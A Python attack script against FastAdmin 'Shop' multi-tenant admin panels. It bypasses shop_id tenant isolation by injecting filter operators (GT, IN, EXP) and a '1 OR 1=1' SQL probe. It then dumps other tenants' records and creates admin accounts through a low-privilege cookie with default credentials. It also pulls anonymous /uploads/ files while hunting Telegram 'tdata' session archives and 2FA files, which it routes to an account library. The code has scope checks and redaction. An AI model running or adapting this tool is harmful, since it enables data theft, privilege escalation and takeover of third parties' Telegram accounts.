#!/usr/bin/env python3
"""FastAdmin Shop 多租户 GT-filter 探针。

对齐：传承/快府·横夺.md
默认：1 页差分。全表 / 批量下 tdata 必须 --full / --download。

示例:
  python3 炼蛊房/fastadmin_shop_tenant_probe.py recon --base https://授权 --case <案卷> --insecure
  python3 炼蛊房/fastadmin_shop_tenant_probe.py gt-probe --base https://授权 --app shop_hq \\
      --path user/user --cookie 'shop_keeplogin=…' --case <案卷> --insecure
  python3 炼蛊房/fastadmin_shop_tenant_probe.py dump-index --base https://授权 --app shop_hq \\
      --path attachment/index --cookie '…' --case <案卷> --pages 1 --insecure
  python3 炼蛊房/fastadmin_shop_tenant_probe.py bfla --base https://授权 --app shop_hq \\
      --cookie '…' --case <案卷> --insecure
  python3 炼蛊房/fastadmin_shop_tenant_probe.py uploads --base https://授权 --case <案卷> \\
      --url /uploads/example.png --insecure
"""
from __future__ import annotations

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-fastadmin_shop_tenant_probe"

OPS_MATRIX = (
    "GT",
    "GTE",
    "LT",
    "LTE",
    ">",
    ">=",
    "<",
    "<=",
    "IN",
    "BETWEEN",
    "NEQ",
    "<>",
)
REDACT_KEYS = (
    "code2",
    "password",
    "salt",
    "token",
    "keeplogin",
    "google_key",
    "secret",
    "pin",
)
TDATA_HINTS = ("/uploads/ck/", ".zip", "tdata", "session")



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "fastadmin_shop_tenant"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if not h:
        raise SystemExit("[scope] 无法解析 host")
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围，拒绝请求")


def ssl_ctx(insecure: bool) -> ssl.SSLContext:
    return ssl._create_unverified_context() if insecure else ssl.create_default_context()


def normalize_base(base: str) -> str:
    b = base.strip().rstrip("/")
    if "://" not in b:
        b = "https://" + b
    return b


def http(
    url: str,
    *,
    method: str = "GET",
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    insecure: bool = False,
    timeout: float = 20,
    max_read: int = 1_500_000,
) -> dict[str, Any]:
    hdrs = {
        "User-Agent": UA,
        "Accept": "application/json,text/html,*/*",
        "X-Requested-With": "XMLHttpRequest",
    }
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, context=ssl_ctx(insecure), timeout=timeout) as resp:
            body = resp.read(max_read)
            return {
                "ok": True,
                "status": resp.status,
                "headers": {k.lower(): v for k, v in resp.headers.items()},
                "body": body.decode("utf-8", errors="replace"),
                "raw": body,
                "url": getattr(resp, "url", url) or url,
            }
    except urllib.error.HTTPError as e:
        raw = e.read(max_read) if e.fp else b""
        return {
            "ok": False,
            "status": e.code,
            "headers": {k.lower(): v for k, v in (e.headers.items() if e.headers else [])},
            "body": raw.decode("utf-8", errors="replace"),
            "raw": raw,
            "url": url,
            "error": str(e),
        }
    except Exception as e:
        return {
            "ok": False,
            "status": 0,
            "headers": {},
            "body": "",
            "raw": b"",
            "url": url,
            "error": str(e),
        }


def save(case: str, name: str, obj: Any) -> Path:
    p = case_dir(case) / name
    p.write_text(json.dumps(obj, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return p


def redact_row(row: dict[str, Any]) -> dict[str, Any]:
    out: dict[str, Any] = {}
    for k, v in row.items():
        lk = str(k).lower()
        if any(x in lk for x in REDACT_KEYS) and v not in (None, "", 0):
            s = str(v)
            out[k] = (s[:2] + "…" + s[-2:]) if len(s) > 4 else "***"
        else:
            out[k] = v
    return out


def parse_fa_json(body: str) -> dict[str, Any]:
    body = (body or "").strip()
    if not body:
        return {}
    try:
        data = json.loads(body)
    except Exception:
        return {}
    if not isinstance(data, dict):
        return {"raw_type": type(data).__name__}
    rows = data.get("rows") or data.get("data") or data.get("list") or []
    if isinstance(data.get("data"), dict):
        inner = data["data"]
        rows = inner.get("rows") or inner.get("list") or rows
        total = inner.get("total", data.get("total"))
    else:
        total = data.get("total")
    if not isinstance(rows, list):
        rows = []
    return {
        "code": data.get("code"),
        "msg": data.get("msg"),
        "total": total,
        "rows": [x for x in rows if isinstance(x, dict)],
    }


def shop_ids_of(rows: list[dict[str, Any]]) -> list[Any]:
    ids: list[Any] = []
    for r in rows:
        if "shop_id" in r:
            ids.append(r.get("shop_id"))
    return ids


def unique_shop_ids(rows: list[dict[str, Any]]) -> list[Any]:
    seen: list[Any] = []
    for sid in shop_ids_of(rows):
        if sid not in seen:
            seen.append(sid)
    return seen


def build_index_url(
    base: str,
    app: str,
    path: str,
    *,
    page: int = 1,
    limit: int = 10,
    filt: dict[str, Any] | None = None,
    op: dict[str, Any] | None = None,
) -> str:
    app = app.strip().strip("/")
    path = path.strip().strip("/")
    q: dict[str, str] = {"page": str(page), "limit": str(limit)}
    if filt is not None:
        q["filter"] = json.dumps(filt, ensure_ascii=False, separators=(",", ":"))
    if op is not None:
        q["op"] = json.dumps(op, ensure_ascii=False, separators=(",", ":"))
    return f"{base}/{app}/{path}?{urllib.parse.urlencode(q)}"


def cookie_headers(base: str, cookie: str, app: str) -> dict[str, str]:
    return {
        "Cookie": cookie,
        "Referer": f"{base}/{app}/",
    }


def op_value_for(op: str) -> tuple[Any, dict[str, str]]:
    if op in ("IN", "NOT IN"):
        return "0,1,2", {op: op}
    if op in ("BETWEEN", "RANGE"):
        return "0,999999", {op: op}
    return "0", {op: op}


def cmd_recon(args: argparse.Namespace) -> int:
    base = normalize_base(args.base)
    ensure_scope(base)
    app = (args.app or "shop_hq").strip().strip("/")
    out: dict[str, Any] = {
        "ts": _now(),
        "base": base,
        "app": app,
        "login": {},
        "config_js": {},
        "cors": {},
        "hsts": {},
        "uploads": [],
        "next": [],
    }
    print(f"[*] recon {base} app={app}")

    login_paths = (
        f"/{app}/index/login",
        f"/{app}/",
        "/index/login",
    )
    for path in login_paths:
        r = http(base + path, insecure=args.insecure)
        body = r.get("body") or ""
        hit = r.get("status") in (200, 302) and any(
            x in body.lower() for x in ("fastadmin", "keeplogin", "shop_hq", "window.config", "password")
        )
        rec = {
            "path": path,
            "status": r.get("status"),
            "hit": hit,
            "len": len(body),
            "title": "",
        }
        if "window.Config" in body or "window.Config =" in body:
            rec["has_window_config"] = True
            out["config_js"]["path"] = path
            out["config_js"]["snippet"] = body[body.find("window.Config") : body.find("window.Config") + 400]
        if "<title>" in body:
            rec["title"] = body.split("<title>", 1)[1].split("</title>", 1)[0][:80]
        out["login"][path] = rec
        mark = "HIT" if hit else str(r.get("status"))
        print(f"  login {path} → {mark} {rec.get('title')}")
        if hit:
            break

    api_paths = (f"/{app}/index/login", "/api/", f"/api/{app}/")
    for path in api_paths:
        r = http(base + path, insecure=args.insecure, headers={"Origin": "https://evil.example"})
        h = r.get("headers") or {}
        acao = h.get("access-control-allow-origin")
        hsts = h.get("strict-transport-security")
        if acao:
            out["cors"] = {"path": path, "acao": acao, "status": r.get("status")}
            print(f"  cors {path} ACAO={acao}")
        if hsts is not None:
            out["hsts"] = {"path": path, "value": hsts}
            print(f"  hsts {hsts}")

    upload_guesses = (
        "/uploads/",
        "/uploads/index.html",
    )
    for path in upload_guesses:
        r = http(base + path, insecure=args.insecure)
        rec = {
            "path": path,
            "status": r.get("status"),
            "len": len(r.get("body") or ""),
            "anon": r.get("status") == 200,
        }
        out["uploads"].append(rec)
        print(f"  uploads {path} → {r.get('status')}")

    if any(x.get("hit") for x in out["login"].values()):
        out["next"].append("有 Shop 登录页 → 拿任意身份后 gt-probe（禁止只测 EQ）")
    if (out.get("cors") or {}).get("acao") == "*":
        out["next"].append("CORS * → 记 H03；不当主链")
    if any(x.get("anon") for x in out["uploads"]):
        out["next"].append("/uploads/ 匿名面在 → 有票后 dump-index attachment")
    elif out["uploads"]:
        out["next"].append("uploads 目录非 200（常见关 listing）→ 必须用具体文件 URL 再测")
    hsts_v = str((out.get("hsts") or {}).get("value") or "")
    if "max-age=0" in hsts_v.replace(" ", ""):
        out["next"].append("HSTS max-age=0 → 记 L07")
    if not out["next"]:
        out["next"].append("未命中 Shop 面 → 回 ThinkPHP手法 或 fastadmin-daifu")
    out["next"].append("有身份必须填 案卷/object_matrix.md；EQ 阴性不算隔离")

    p = save(args.case, "recon.json", out)
    print(f"[+] {p}")
    for n in out["next"]:
        print(f"  next: {n}")
    return 0


def _fa_get(
    base: str,
    app: str,
    path: str,
    cookie: str,
    *,
    insecure: bool,
    page: int = 1,
    limit: int = 10,
    filt: dict[str, Any] | None = None,
    op: dict[str, Any] | None = None,
) -> dict[str, Any]:
    url = build_index_url(base, app, path, page=page, limit=limit, filt=filt, op=op)
    r = http(url, insecure=insecure, headers=cookie_headers(base, cookie, app))
    parsed = parse_fa_json(r.get("body") or "")
    return {
        "url": url,
        "status": r.get("status"),
        "error": r.get("error"),
        "waf": int(r.get("status") or 0) in (403, 406, 418, 444, 468),
        "code": parsed.get("code"),
        "msg": parsed.get("msg"),
        "total": parsed.get("total"),
        "row_count": len(parsed.get("rows") or []),
        "shop_ids": unique_shop_ids(parsed.get("rows") or []),
        "sample": [redact_row(x) for x in (parsed.get("rows") or [])[:3]],
        "rows_redacted": [redact_row(x) for x in (parsed.get("rows") or [])],
        "snippet": (r.get("body") or "")[:180],
    }


def cmd_gt_probe(args: argparse.Namespace) -> int:
    base = normalize_base(args.base)
    ensure_scope(base)
    cookie = (args.cookie or "").strip()
    if not cookie:
        raise SystemExit("gt-probe 需要 --cookie")
    app = args.app.strip().strip("/")
    path = args.path.strip().strip("/")
    field = args.field.strip()
    out: dict[str, Any] = {
        "ts": _now(),
        "base": base,
        "app": app,
        "path": path,
        "field": field,
        "trials": [],
        "hit": False,
        "next": [],
    }
    print(f"[*] gt-probe {base}/{app}/{path} field={field}")

    baseline = _fa_get(base, app, path, cookie, insecure=args.insecure, limit=args.limit)
    out["trials"].append({"name": "A_baseline", "filter": None, "op": None, **baseline})
    print(f"  A baseline status={baseline['status']} total={baseline['total']} shops={baseline['shop_ids']}")

    own = args.own_shop
    if own is None and baseline["shop_ids"]:
        own = baseline["shop_ids"][0]
    foreign = args.foreign_shop
    if foreign is None:
        try:
            foreign = int(own) + 1 if own is not None and str(own).isdigit() else 1
        except Exception:
            foreign = 1

    eq_foreign = _fa_get(
        base, app, path, cookie, insecure=args.insecure, limit=args.limit,
        filt={field: str(foreign)}, op={field: "EQ"},
    )
    out["trials"].append({
        "name": "B_eq_foreign",
        "filter": {field: str(foreign)},
        "op": {field: "EQ"},
        **eq_foreign,
    })
    print(f"  B EQ foreign={foreign} status={eq_foreign['status']} total={eq_foreign['total']} shops={eq_foreign['shop_ids']}")

    sqli = _fa_get(
        base, app, path, cookie, insecure=args.insecure, limit=args.limit,
        filt={"id": "1 OR 1=1"}, op={"id": "EQ"},
    )
    out["trials"].append({"name": "C_sqli", "filter": {"id": "1 OR 1=1"}, **sqli})
    print(f"  C SQLi status={sqli['status']} waf={sqli['waf']}")

    exp = _fa_get(
        base, app, path, cookie, insecure=args.insecure, limit=args.limit,
        filt={field: "1"}, op={field: "EXP"},
    )
    out["trials"].append({"name": "C_exp", "filter": {field: "1"}, "op": {field: "EXP"}, **exp})
    print(f"  C EXP status={exp['status']} waf={exp['waf']}")

    base_total = _as_int(baseline.get("total"))
    base_shops = set(map(str, baseline.get("shop_ids") or []))

    for op_name in OPS_MATRIX:
        val, _ = op_value_for(op_name)
        trial = _fa_get(
            base, app, path, cookie, insecure=args.insecure, limit=args.limit,
            filt={field: val}, op={field: op_name},
        )
        shops = set(map(str, trial.get("shop_ids") or []))
        total = _as_int(trial.get("total"))
        cross = False
        if total is not None and base_total is not None and total > base_total:
            cross = True
        if shops - base_shops:
            cross = True
        trial_rec = {
            "name": f"D_{op_name}",
            "filter": {field: val},
            "op": {field: op_name},
            "cross_tenant": cross,
            **trial,
        }
        out["trials"].append(trial_rec)
        flag = "CROSS" if cross else str(trial.get("status"))
        print(f"  D {op_name}={val} → {flag} total={trial.get('total')} shops={trial.get('shop_ids')}")
        if cross:
            out["hit"] = True

    if out["hit"]:
        out["next"].append("L2 成立：运算符覆盖租户字段。下一步 dump-index attachment + uploads 抽样")
        out["next"].append("禁止再写「shop_id 隔离正确」。全表先问")
    else:
        out["next"].append("本路径运算符未放大 total → 换 path（attachment/auth/admin）或换字段")
        if sqli.get("waf") or exp.get("waf"):
            out["next"].append("WAF 拦了 SQL/EXP，这不是隔离证明")
    out["own_shop"] = own
    out["foreign_shop"] = foreign

    p = save(args.case, f"gt_probe_{path.replace('/', '_')}.json", out)
    print(f"[+] {p} hit={out['hit']}")
    for n in out["next"]:
        print(f"  next: {n}")
    return 0


def _as_int(v: Any) -> int | None:
    if v is None:
        return None
    try:
        return int(v)
    except (TypeError, ValueError):
        return None


def cmd_dump_index(args: argparse.Namespace) -> int:
    base = normalize_base(args.base)
    ensure_scope(base)
    cookie = (args.cookie or "").strip()
    if not cookie:
        raise SystemExit("dump-index 需要 --cookie")
    if args.full and args.pages == 1:
        pages = 9999
    else:
        pages = max(1, args.pages)
    if args.full:
        print("[!] --full 会翻完全表，确认授权且用户要求全量")
    app = args.app.strip().strip("/")
    path = args.path.strip().strip("/")
    field = args.field.strip()
    filt = {field: args.filter_value}
    op = {field: args.op}
    rows: list[dict[str, Any]] = []
    pages_raw: list[dict[str, Any]] = []
    total = None
    for page in range(1, pages + 1):
        rec = _fa_get(
            base, app, path, cookie, insecure=args.insecure,
            page=page, limit=args.limit, filt=filt, op=op,
        )
        batch = rec.get("rows_redacted") or []
        total = rec.get("total", total)
        rows.extend(batch)
        pages_raw.append({
            "page": page,
            "status": rec.get("status"),
            "total": rec.get("total"),
            "row_count": rec.get("row_count"),
            "shop_ids": rec.get("shop_ids"),
        })
        print(f"  page {page} status={rec.get('status')} got={len(batch)} acc={len(rows)} total={total}")
        if rec.get("waf"):
            print("  WAF，停止翻页")
            break
        if not batch or len(batch) < args.limit:
            break
        if total is not None and len(rows) >= int(total):
            break

    urls = []
    for row in rows:
        u = row.get("url") or row.get("fullurl") or row.get("filepath")
        if isinstance(u, str) and u:
            urls.append(u)
    tdata_urls = [u for u in urls if any(h in u.lower() for h in TDATA_HINTS)]
    summary = {
        "ts": _now(),
        "base": base,
        "app": app,
        "path": path,
        "filter": filt,
        "op": op,
        "pages": pages_raw,
        "row_count": len(rows),
        "total": total,
        "shop_ids": unique_shop_ids(rows),
        "file_urls_sample": urls[:30],
        "tdata_url_count": len(tdata_urls),
        "tdata_urls_sample": tdata_urls[:20],
        "rows_redacted": [redact_row(x) for x in rows[:50]],
        "next": [],
    }
    if len(unique_shop_ids(rows)) > 1:
        summary["next"].append("跨 shop_id 已在本页出现 → L2")
    if tdata_urls:
        summary["next"].append("附件疑似 tdata → uploads --url 抽 1 个验证匿名下载")
    if not args.full and total and _as_int(total) and _as_int(total) > len(rows):
        summary["next"].append(f"服务端 total={total}，默认未拉完。全表加 --full（先问）")

    p = save(args.case, f"dump_{path.replace('/', '_')}.json", summary)
    raw_path = case_dir(args.case) / f"dump_{path.replace('/', '_')}_rows.json"
    raw_path.write_text(
        json.dumps({"ts": _now(), "rows": [redact_row(x) for x in rows]}, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )
    print(f"[+] {p}")
    print(f"[+] {raw_path} rows={len(rows)} shops={summary['shop_ids']} tdata_urls={len(tdata_urls)}")
    for n in summary["next"]:
        print(f"  next: {n}")
    return 0


def cmd_bfla(args: argparse.Namespace) -> int:
    base = normalize_base(args.base)
    ensure_scope(base)
    cookie = (args.cookie or "").strip()
    if not cookie:
        raise SystemExit("bfla 需要 --cookie")
    app = args.app.strip().strip("/")
    out: dict[str, Any] = {"ts": _now(), "base": base, "app": app, "group": {}, "admin": {}, "create": None, "next": []}
    print(f"[*] bfla {base}/{app}")

    group = _fa_get(base, app, "auth/group/index", cookie, insecure=args.insecure, limit=50)
    out["group"] = group
    star = any(
        str((x or {}).get("rules")) == "*"
        for x in (group.get("sample") or [])
    )
    print(f"  auth/group status={group['status']} total={group['total']} rules_star={star}")
    if group.get("status") == 200 and (group.get("row_count") or 0) > 0:
        out["next"].append("H01：低权可读权限组")
    if star:
        out["next"].append("读到 rules=* 超管组 → 记证据，不要默认改原超管密")

    admin = _fa_get(base, app, "auth/admin/index", cookie, insecure=args.insecure, limit=20)
    out["admin"] = admin
    print(f"  auth/admin status={admin['status']} total={admin['total']}")

    if args.create:
        username = args.create_user
        password = args.create_pass
        body = urllib.parse.urlencode({
            "group[]": args.create_group,
            "row[username]": username,
            "row[password]": password,
            "row[nickname]": username,
            "row[addgroup_ids_type]": "0",
            "row[kefu_type]": "1",
        }).encode()
        url = f"{base}/{app}/auth/admin/add"
        r = http(
            url,
            method="POST",
            data=body,
            insecure=args.insecure,
            headers={
                **cookie_headers(base, cookie, app),
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        parsed = parse_fa_json(r.get("body") or "")
        out["create"] = {
            "url": url,
            "status": r.get("status"),
            "code": parsed.get("code"),
            "msg": parsed.get("msg"),
            "snippet": (r.get("body") or "")[:200],
            "note": "绑超管组可能 code=1 但 group_ids 未写入",
        }
        print(f"  admin/add status={r.get('status')} code={parsed.get('code')} msg={parsed.get('msg')}")
        if parsed.get("code") == 1:
            out["next"].append("H02：低权可建号（密码勿写 STATUS）")
    else:
        out["next"].append("未 --create：只探测读面。真建号需显式 --create")

    p = save(args.case, "bfla.json", out)
    print(f"[+] {p}")
    for n in out["next"]:
        print(f"  next: {n}")
    return 0


def cmd_uploads(args: argparse.Namespace) -> int:
    base = normalize_base(args.base)
    ensure_scope(base)
    urls: list[str] = []
    if args.from_dump:
        dump_dir = case_dir(args.case)
        for p in sorted(dump_dir.glob("dump_*_rows.json")):
            try:
                data = json.loads(p.read_text(encoding="utf-8"))
            except Exception:
                continue
            for row in data.get("rows") or []:
                u = row.get("url") or row.get("fullurl")
                if isinstance(u, str) and u:
                    urls.append(u)
    if args.url:
        urls.insert(0, args.url)
    if not urls:
        urls = ["/uploads/"]
    # 默认只测前 5 个，避免批量拉 tdata
    urls = urls[: max(1, args.sample)]
    out: dict[str, Any] = {"ts": _now(), "base": base, "checks": [], "next": []}
    print(f"[*] uploads anon sample={len(urls)}")
    for u in urls:
        if u.startswith("/"):
            full = base + u
        elif u.startswith("http"):
            full = u
        else:
            full = base + "/" + u.lstrip("/")
        ensure_scope(full)
        r = http(full, insecure=args.insecure, max_read=64_000)
        rec = {
            "url": u if u.startswith("/") else urllib.parse.urlparse(full).path,
            "status": r.get("status"),
            "len": len(r.get("raw") or b""),
            "anon_ok": r.get("status") == 200,
            "ct": (r.get("headers") or {}).get("content-type"),
        }
        out["checks"].append(rec)
        print(f"  {rec['status']} {rec['url']} len={rec['len']} ct={rec['ct']}")
    if any(x.get("anon_ok") for x in out["checks"]):
        out["next"].append("匿名 /uploads/ 成立。样本即可，批量下 tdata 先问")
        out["next"].append("zip 内找 2FA.txt / tdata/ → tg-account-library")
    p = save(args.case, "uploads_anon.json", out)
    print(f"[+] {p}")
    for n in out["next"]:
        print(f"  next: {n}")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="FastAdmin Shop 多租户 GT-filter 探针（授权范围内）")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("recon", help="登录页 / Config / CORS / uploads 匿名")
    p.add_argument("--base", required=True)
    p.add_argument("--case", required=True)
    p.add_argument("--app", default="shop_hq")
    p.add_argument("--insecure", action="store_true")
    p.set_defaults(func=cmd_recon)

    p = sub.add_parser("gt-probe", help="EQ / SQLi / 运算符矩阵差分（1 页）")
    p.add_argument("--base", required=True)
    p.add_argument("--case", required=True)
    p.add_argument("--cookie", required=True)
    p.add_argument("--app", default="shop_hq")
    p.add_argument("--path", default="user/user")
    p.add_argument("--field", default="shop_id")
    p.add_argument("--own-shop", dest="own_shop", default=None)
    p.add_argument("--foreign-shop", dest="foreign_shop", default=None)
    p.add_argument("--limit", type=int, default=10)
    p.add_argument("--insecure", action="store_true")
    p.set_defaults(func=cmd_gt_probe)

    p = sub.add_parser("dump-index", help="带 GT filter 拉 index（默认 1 页）")
    p.add_argument("--base", required=True)
    p.add_argument("--case", required=True)
    p.add_argument("--cookie", required=True)
    p.add_argument("--app", default="shop_hq")
    p.add_argument("--path", default="user/user")
    p.add_argument("--field", default="shop_id")
    p.add_argument("--op", default="GT")
    p.add_argument("--filter-value", default="0")
    p.add_argument("--limit", type=int, default=100)
    p.add_argument("--pages", type=int, default=1)
    p.add_argument("--full", action="store_true", help="翻完全表（先问）")
    p.add_argument("--insecure", action="store_true")
    p.set_defaults(func=cmd_dump_index)

    p = sub.add_parser("bfla", help="auth/group + auth/admin 读面；--create 才建号")
    p.add_argument("--base", required=True)
    p.add_argument("--case", required=True)
    p.add_argument("--cookie", required=True)
    p.add_argument("--app", default="shop_hq")
    p.add_argument("--create", action="store_true")
    p.add_argument("--create-user", default="audit_gt")
    p.add_argument("--create-pass", default="Audit2026!")
    p.add_argument("--create-group", default="1")
    p.add_argument("--insecure", action="store_true")
    p.set_defaults(func=cmd_bfla)

    p = sub.add_parser("uploads", help="匿名访问 /uploads/ 样本")
    p.add_argument("--base", required=True)
    p.add_argument("--case", required=True)
    p.add_argument("--url", default="")
    p.add_argument("--from-dump", action="store_true")
    p.add_argument("--sample", type=int, default=5)
    p.add_argument("--insecure", action="store_true")
    p.set_defaults(func=cmd_uploads)

    args = ap.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    sys.exit(main())
